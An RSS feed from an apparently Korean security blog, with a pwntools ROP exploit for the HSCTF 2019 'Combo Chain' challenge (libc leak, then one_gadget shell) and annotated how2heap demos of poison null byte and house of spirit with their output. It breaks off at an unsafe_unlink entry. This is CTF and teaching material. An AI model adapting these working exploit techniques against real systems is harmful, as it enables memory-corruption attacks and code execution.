<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>j0n9hyun</title>
    <link>http://j0n9hyun.github.io/</link>
    <atom:link href="/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>j0n9yhun&#39;s repository</description>
    <pubDate>Sat, 08 Jun 2019 22:58:20 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>HSCTF 2019 Combo Chain</title>
      <link>http://j0n9hyun.github.io/2019/06/09/HSCTF-2019-Combo-Chain/</link>
      <guid>http://j0n9hyun.github.io/2019/06/09/HSCTF-2019-Combo-Chain/</guid>
      <pubDate>Sat, 08 Jun 2019 22:28:42 GMT</pubDate>
      <description>
      
        
        
          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;h3 id=&quot;combo-chain&quot;&gt;&lt;a class=&quot;markdownIt
        
      
      </description>
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h3 id="combo-chain"><a class="markdownIt-Anchor" href="#combo-chain"></a> Combo Chain</h3><p><a href="https://github.com/j0n9hyun/j0n9hyun.github.io/files/3268976/combo-chain.zip" target="_blank" rel="noopener"><strong>Binary File</strong></a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#r = process('./combo-chain')</span></span><br><span class="line">r = remote(<span class="string">'pwn.hsctf.com'</span>, <span class="number">2345</span>)</span><br><span class="line">e = ELF(<span class="string">'./combo-chain'</span>)</span><br><span class="line">libc = e.libc</span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> a: r.recvuntil(a)</span><br><span class="line">sl = <span class="keyword">lambda</span> a: r.sendline(a)</span><br><span class="line">sa = <span class="keyword">lambda</span> a, b: r.sendafter(a, b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a, b: r.sendlineafter(a, b)</span><br><span class="line">ex = <span class="keyword">lambda</span> : r.interactive()</span><br><span class="line"></span><br><span class="line">gets_offset = libc.symbols[<span class="string">'gets'</span>]</span><br><span class="line">gets_got = e.got[<span class="string">'gets'</span>]</span><br><span class="line">printf_plt = e.plt[<span class="string">'printf'</span>]</span><br><span class="line">main = e.symbols[<span class="string">'main'</span>]</span><br><span class="line">pr = <span class="number">0x0000000000401263</span> <span class="comment"># pop rdi; ret</span></span><br><span class="line">nop = <span class="number">0x000000000040114f</span></span><br><span class="line">one_gadget = <span class="number">0x4526a</span></span><br><span class="line"></span><br><span class="line">p = <span class="string">""</span></span><br><span class="line">p += <span class="string">"\x90"</span>*<span class="number">16</span></span><br><span class="line">p += p64(pr)</span><br><span class="line">p += p64(gets_got)</span><br><span class="line">p += p64(nop)</span><br><span class="line">p += p64(printf_plt)</span><br><span class="line">p += p64(main)</span><br><span class="line">sla(<span class="string">": "</span>, p)</span><br><span class="line"></span><br><span class="line">leaked = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line"><span class="keyword">print</span> hex(leaked)</span><br><span class="line">libc_base = leaked - gets_offset</span><br><span class="line">one_shot = libc_base + one_gadget</span><br><span class="line"></span><br><span class="line">p = <span class="string">""</span></span><br><span class="line">p += <span class="string">"\x90"</span>*<span class="number">16</span></span><br><span class="line">p += p64(one_shot)</span><br><span class="line">sla(<span class="string">": "</span>, p)</span><br><span class="line">ex()</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      <comments>http://j0n9hyun.github.io/2019/06/09/HSCTF-2019-Combo-Chain/#disqus_thread</comments>
    </item>
    
    <item>
      <title>[How2Heap] Poison_null_byte</title>
      <link>http://j0n9hyun.github.io/2019/05/31/How2Heap-Poison-null-byte/</link>
      <guid>http://j0n9hyun.github.io/2019/05/31/How2Heap-Poison-null-byte/</guid>
      <pubDate>Fri, 31 May 2019 02:18:06 GMT</pubDate>
      <description>
      
        
        
          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;h3 id=&quot;poison_null_bytec&quot;&gt;&lt;a class=&quot;mark
        
      
      </description>
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h3 id="poison_null_bytec"><a class="markdownIt-Anchor" href="#poison_null_bytec"></a> Poison_null_byte.c</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"null byte 2.0!\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"테스트 환경: Ubuntu 14.04 64bit.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이 기법은 glibc에서 tcache 옵션이 disabled된 상태에만 작동한다.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이 기법은 null바이트를 이용하여 malloc된 영역으로 off-by-one할때 사용할 수 있다.\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint8_t</span>* a;</span><br><span class="line"><span class="keyword">uint8_t</span>* b;</span><br><span class="line"><span class="keyword">uint8_t</span>* c;</span><br><span class="line"><span class="keyword">uint8_t</span>* b1;</span><br><span class="line"><span class="keyword">uint8_t</span>* b2;</span><br><span class="line"><span class="keyword">uint8_t</span>* d;</span><br><span class="line"><span class="keyword">void</span> *barrier;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"'a'에 0x100 bytes 할당한다.\n"</span>);</span><br><span class="line">a = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"a: %p\n"</span>, a);</span><br><span class="line"><span class="keyword">int</span> real_a_size = malloc_usable_size(a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"우리는 'a'에 overflow가 발생하는 것을 원하기 때문에, 'a'의 '진짜' 크기를 알 필요가 있다. "</span></span><br><span class="line"><span class="string">"(반올림 때문에 0x100 이상이 될 수 있음): %#x\n"</span>, real_a_size);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* chunk size attribute cannot have a least significant byte with a value of 0x00.</span></span><br><span class="line"><span class="comment">* the least significant byte of this will be 0x10, because the size of the chunk includes</span></span><br><span class="line"><span class="comment">* the amount requested plus some amount required for the metadata. */</span></span><br><span class="line">b = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"b: %p\n"</span>, b);</span><br><span class="line"></span><br><span class="line">c = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"c: %p\n"</span>, c);</span><br><span class="line"></span><br><span class="line">barrier =  <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"barrier를 %p에 할당하면, c는 free될 때 top-chunk로 consolidate되지 않는다.\n"</span></span><br><span class="line"><span class="string">"barrier가 엄격하게 필요한 건 아니지만 상황을 덜 혼란스럽게 만든다.\n"</span>, barrier);</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span>* b_size_ptr = (<span class="keyword">uint64_t</span>*)(b - <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// added fix for size==prev_size(next_chunk) check in newer versions of glibc</span></span><br><span class="line"><span class="comment">// https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30</span></span><br><span class="line"><span class="comment">// this added check requires we are allowed to have null pointers in b (not just a c string)</span></span><br><span class="line"><span class="comment">//*(size_t*)(b+0x1f0) = 0x200;</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"glibc의 새 버전에서 'chunksize(P) != prev_size (next_chunk(P))' 검사를 통과하려면 b안에 변경된(updated) 크기를 가지고 있어야 한다.\n"</span>);</span><br><span class="line"><span class="comment">// we set this location to 0x200 since 0x200 == (0x211 &amp; 0xff00)</span></span><br><span class="line"><span class="comment">// which is the value of b.size after its first byte has been overwritten with a NULL byte</span></span><br><span class="line">*(<span class="keyword">size_t</span>*)(b+<span class="number">0x1f0</span>) = <span class="number">0x200</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// this technique works by overwriting the size metadata of a free chunk</span></span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"b.size: %#lx\n"</span>, *b_size_ptr);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"b.size: (0x200 + 0x10) | prev_in_use\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"우리는 'b'의 metadata에 있는 single null byte를 이용해서 'a'를 overflow한다.\n"</span>);</span><br><span class="line">a[real_a_size] = <span class="number">0</span>; <span class="comment">// exploit된 bug "</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"b.size: %#lx\n"</span>, *b_size_ptr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span>* c_prev_size_ptr = ((<span class="keyword">uint64_t</span>*)c)<span class="number">-2</span>;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"c.prev_size: %#lx\n"</span>,*c_prev_size_ptr);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 이 malloc은 b였던 chunk에서 unlink를 호출하는 결과일 것이다.</span></span><br><span class="line"><span class="comment">// The added check (commit id: 17f487b), if not properly handled as we did before,</span></span><br><span class="line"><span class="comment">// will detect the heap corruption now.</span></span><br><span class="line"><span class="comment">// The check is this: chunksize(P) != prev_size (next_chunk(P)) where</span></span><br><span class="line"><span class="comment">// P == b-0x10, chunksize(P) == *(b-0x10+0x8) == 0x200 (was 0x210 before the overflow)</span></span><br><span class="line"><span class="comment">// next_chunk(P) == b-0x10+0x200 == b+0x1f0</span></span><br><span class="line"><span class="comment">// prev_size (next_chunk(P)) == *(b+0x1f0) == 0x200</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"우리는 chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P)) 이후로 검사를 통과할 것이다.\n"</span>,</span><br><span class="line">*((<span class="keyword">size_t</span>*)(b<span class="number">-0x8</span>)), *(<span class="keyword">size_t</span>*)(b<span class="number">-0x10</span> + *((<span class="keyword">size_t</span>*)(b<span class="number">-0x8</span>))));</span><br><span class="line">b1 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"b1: %p\n"</span>,b1);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이제 우리는 'b1'을 malloc한다. 그것은 'b'에 있던 곳에 위치할 것이다. "</span></span><br><span class="line"><span class="string">"이 시점에서 c.prev_size가 변경됐어야 했지만, 그렇지 않았다: %#lx\n"</span>,*c_prev_size_ptr);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"흥미롭게도, c.prev_size의 변경된 값은 c.prev_size 앞에 0x10 bytes로 write됐다: %lx\n"</span>,*(((<span class="keyword">uint64_t</span>*)c)<span class="number">-4</span>));</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"'victim' chunk에 'b2'를 malloc한다.\n"</span>);</span><br><span class="line"><span class="comment">// 보통 b2(victim)는 우리가 조작할 수 있는 취약한 포인터를 가진 구조일 것이다.</span></span><br><span class="line"></span><br><span class="line">b2 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"b2: %p\n"</span>,b2);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(b2,<span class="string">'B'</span>,<span class="number">0x80</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"현재 b2 content:\n%s\n"</span>,b2);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이제 우리는 'b1'과 c를 free한다: 'b1'과 'c'청크는 consolidate될 것이다.(b2를 잊어버리고)\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(b1);</span><br><span class="line"><span class="built_in">free</span>(c);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"마지막으로, 'd'를 할당해서 'b2'를 overlapping한다.\n"</span>);</span><br><span class="line">d = <span class="built_in">malloc</span>(<span class="number">0x300</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"d: %p\n"</span>,d);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"'d'와 'b2'가 overlap되었다.\n"</span>);</span><br><span class="line"><span class="built_in">memset</span>(d,<span class="string">'D'</span>,<span class="number">0x300</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"바뀐 b2 content:\n%s\n"</span>,b2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>null byte 2.0!</code><br><code>테스트 환경: Ubuntu 14.04 64bit.</code><br>이 기법은 glibc에서 tcache 옵션이 disabled된 상태에만 작동한다.<br>이 기법은 null바이트를 이용하여 malloc된 영역으로 off-by-one할때 사용할 수 있다.<br>'a’에 0x100 bytes 할당한다.<br><code>a: 0x603010</code><br>우리는 'a’에 overflow가 발생하는 것을 원하기 때문에, 'a’의 ‘진짜’ 크기를 알 필요가 있다. (반올림 때문에 0x100 이상이 될 수 있음): <code>0x108</code><br><code>b: 0x603120</code><br><code>c: 0x603330</code><br>barrier를 0x603440에 할당하면, c는 free될 때 top-chunk로 consolidate되지 않는다.<br>barrier가 엄격하게 필요한 건 아니지만 상황을 덜 혼란스럽게 만든다.<br>glibc의 새 버전에서 ‘chunksize§ != prev_size (next_chunk§)’ 검사를 통과하려면 b안에 변경된(updated) 크기를 가지고 있어야 한다.<br><code>b.size: 0x211</code><br><code>b.size: (0x200 + 0x10) | prev_in_use</code><br>우리는 'b’의 metadata에 있는 single null byte를 이용해서 'a’를 overflow한다.<br><code>b.size: 0x200</code><br><code>c.prev_size: 0x210</code><br>우리는 chunksize§ == 0x200 == 0x200 == prev_size (next_chunk§) 이후로 검사를 통과할 것이다.<br><code>b1: 0x603120</code><br>이제 우리는 'b1’을 malloc한다. 그것은 'b’에 있던 곳에 위치할 것이다. 이 시점에서 c.prev_size가 변경됐어야 했지만, 그렇지 않았다: <code>0x210</code><br>흥미롭게도, c.prev_size의 변경된 값은 c.prev_size 앞에 0x10 bytes로 write됐다: f0<br>‘victim’ chunk에 'b2’를 malloc한다.<br><code>b2: 0x603230</code><br>현재 b2 content:<br><code>BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB</code><br>이제 우리는 'b1’과 c를 free한다: 'b1’과 'c’청크는 consolidate될 것이다.(b2를 잊어버리고)<br>마지막으로, 'd’를 할당해서 'b2’를 overlapping한다.<br><code>d: 0x603120</code><br>'d’와 'b2’가 overlap되었다.<br><code>바뀐 b2 content: DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD</code></p>]]></content:encoded>
      
      <comments>http://j0n9hyun.github.io/2019/05/31/How2Heap-Poison-null-byte/#disqus_thread</comments>
    </item>
    
    <item>
      <title>[How2Heap] House_of_spirit</title>
      <link>http://j0n9hyun.github.io/2019/05/29/How2Heap-House-of-spirit-c/</link>
      <guid>http://j0n9hyun.github.io/2019/05/29/How2Heap-House-of-spirit-c/</guid>
      <pubDate>Wed, 29 May 2019 07:05:24 GMT</pubDate>
      <description>
      
        
        
          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;h3 id=&quot;house_of_spiritc&quot;&gt;&lt;a class=&quot;markd
        
      
      </description>
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h3 id="house_of_spiritc"><a class="markdownIt-Anchor" href="#house_of_spiritc"></a> House_of_spirit.c</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"house of spirit\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc을 한 번 호출해서 메모리를 설정한다.\n"</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이제 fake fastbin 영역을 가리키는 포인터를 overwirte할 것이다.\n"</span>);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *a;</span><br><span class="line"><span class="comment">// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> fake_chunks[<span class="number">10</span>] __attribute__ ((aligned (<span class="number">16</span>)));</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이 영역(메모리 길이: %lu)은 chunk가 2개 있다. 첫번째는 %p에서 시작하고 두번째는 %p에서 시작한다.\n"</span>, <span class="keyword">sizeof</span>(fake_chunks), &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">9</span>]);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이 영역의 chunk 크기는 fastbins에 속하는 영역(x64: &lt;= 128bytes)보다 큰 16bytes 이상이어야 한다.(chunk data를 수용하기 위해) PREV_INUSE(lsb)는 fastbin-sized chunk의 free로 무시되지만 IS_MMAPPED(second lsb)나 NON_MAIN_ARENA(third lsb)는 문제를 야기한다.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n"</span>);</span><br><span class="line">fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"*next* fake 영역의 chunk 크기는 온전해야 한다. 그것은 &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (main arena는 기본적으로 &lt; 128kb)이 nextsize 무결성 체크를 통과한다.그래서 fastbin 크기가 필요 없다.\n"</span>);</span><br><span class="line"><span class="comment">// fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8</span></span><br><span class="line">fake_chunks[<span class="number">9</span>] = <span class="number">0x1234</span>; <span class="comment">// nextsize</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이제 포인터를 첫번째 fake chunk안에 있는 fake 영역의 주소로 overwrite할 것이다, %p.\n"</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n"</span>);</span><br><span class="line">a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"overwrite된 포인터를 free한다.\n"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"-------free(a)-------\n"</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"next malloc은 %p에 있는 fake chunk의 영역을 반환할 것이다. 그러면 %p이 될 것이다!\n"</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc(0x30): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">0x30</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>house of spirit</code><br>malloc을 한 번 호출해서 메모리를 설정한다.<br>이제 fake fastbin 영역을 가리키는 포인터를 overwirte할 것이다.<br>이 영역(메모리 길이: 80)은 chunk가 2개 있다. 첫번째는 <code>0x7fffffffe338</code>에서 시작하고 두번째는 <code>0x7fffffffe378</code>에서 시작한다.<br>이 영역의 chunk 크기는 fastbins에 속하는 영역(x64: &lt;= 128bytes)보다 큰 16bytes 이상이어야 한다.(chunk data를 수용하기 위해) PREV_INUSE(lsb)는 fastbin-sized chunk의 free로 무시되지만 IS_MMAPPED(second lsb)나 NON_MAIN_ARENA(third lsb)는 문제를 야기한다.<br>이제 포인터를 첫번째 fake chunk안에 있는 fake 영역의 주소로 overwrite할 것이다, <code>0x7fffffffe338</code><br>overwrite된 포인터를 free한다.<br>-------free(a)-------<br>next malloc은 <code>0x7fffffffe338</code>에 있는 fake chunk의 영역을 반환할 것이다. 그러면 <code>0x7fffffffe340</code>이 될 것이다!<br><code>malloc(0x30): 0x7fffffffe340</code></p>]]></content:encoded>
      
      <comments>http://j0n9hyun.github.io/2019/05/29/How2Heap-House-of-spirit-c/#disqus_thread</comments>
    </item>
    
    <item>
      <title>[How2Heap] unsafe_unlink</title>
      <link>http://j0n9hyun.github.io/2019/05/29/How2Heap-unsafe-unlink-c/</link>
      <guid>http://j0n9hyun.github.io/2019/05/29/How2Heap-unsafe-unlink-c/</guid>
      <pubDate>Wed, 29 May 2019 05:50:05 GMT</pubDate>
      <description>
      
        
        
          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;h3 id=&quot;unsafe_unlinkc&quot;&gt;&lt;a class=&quot;markdow
        
      
      </description>
      
